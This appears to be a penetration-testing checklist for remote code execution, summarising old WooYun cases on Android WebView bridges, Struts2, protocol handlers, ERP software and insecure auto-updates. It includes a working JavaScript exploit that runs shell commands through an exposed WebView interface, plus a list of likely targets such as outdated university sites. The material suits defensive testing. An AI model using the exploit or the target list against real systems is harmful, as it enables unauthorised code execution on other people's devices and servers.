# Remote Code Execution (RCE) Testing Checklist
> Derived from 11 real-world vulnerability cases (WooYun 2010-2016)

## High-Risk Parameters to Test
| Parameter | Context | Notes |
|-----------|---------|-------|
| `id` | 1x | Resource identifier triggering backend processing |
| `url` | 1x | URL parameter in protocol handlers |
| `repo` | 1x | Repository/package name parameters |
| `intent` | 1x | Android intent parameters |
| `apkpackagename` | 1x | Android package identifiers |

## Attack Pattern Distribution
| Pattern | Count | Percentage |
|---------|-------|------------|
| Remote command execution | 8 | 73% |
| Remote code execution | 3 | 27% |

## Vulnerability Categories

### 1. Android WebView Interface Exploitation (~35% of cases)
The most common RCE vector in this dataset targets mobile apps.

**Mechanism**: `addJavascriptInterface()` in Android WebView (pre-4.2)
exposes Java objects to JavaScript, enabling `java.lang.Runtime.exec()`.

**Detection pattern:**
```javascript
// Scan for exposed interfaces
for (var obj in window) {
  if ("getClass" in window[obj]) {
    // Vulnerable interface found
  }
}
```

**Exploitation:**
```javascript
function execute(cmdArgs) {
  return Navigator.getClass()
    .forName("java.lang.Runtime")
    .getMethod("getRuntime", null)
    .invoke(null, null)
    .exec(cmdArgs);
}
execute(["/system/bin/sh", "-c", "id"]);
```

### 2. Struts2 Remote Code Execution (~25% of cases)
Same as command execution but categorized under RCE.
- University and government systems running outdated Struts2
- `.action` endpoints with OGNL injection

### 3. Desktop Application Protocol Handlers (~15% of cases)
- Custom protocol schemes (e.g., `bdbrowser://`)
- IM client message handling leading to local file/command execution
- Auto-update mechanisms hijacked via MITM

### 4. Enterprise Software RCE (~15% of cases)
- SAGE ERP universal RCE
- ActiveX buffer overflow in client applications
- SourceForge-class platform vulnerabilities

### 5. Client-Side MITM to RCE (~10% of cases)
- Auto-update over HTTP (no HTTPS/signature verification)
- Attacker replaces update binary via network interception
- Affects desktop and mobile applications

## Quick Test Vectors
```
1. Android apps: Check for addJavascriptInterface in APK
2. Web apps: Test .action/.do endpoints for Struts2
3. Desktop apps: Test custom protocol handlers
4. Auto-update: Check if updates use HTTPS + signature verification
5. Enterprise: Check exposed management consoles
6. Mobile: Test WebView for JavaScript bridge interfaces
```

## High-Value Targets
- **Mobile applications**: Android apps with WebView bridges
- **IM/messaging clients**: Message rendering with code execution
- **Desktop applications**: Protocol handlers and auto-updaters
- **Enterprise ERP systems**: Server-side code execution
- **Educational institution sites**: Often running outdated frameworks

## Root Causes
| Cause | Frequency |
|-------|-----------|
| Insecure Android WebView bridges | Most common |
| Unpatched framework vulnerabilities | Very common |
| Unsafe protocol handler registration | Occasional |
| HTTP auto-update without verification | Occasional |
| ActiveX/legacy plugin vulnerabilities | Rare |
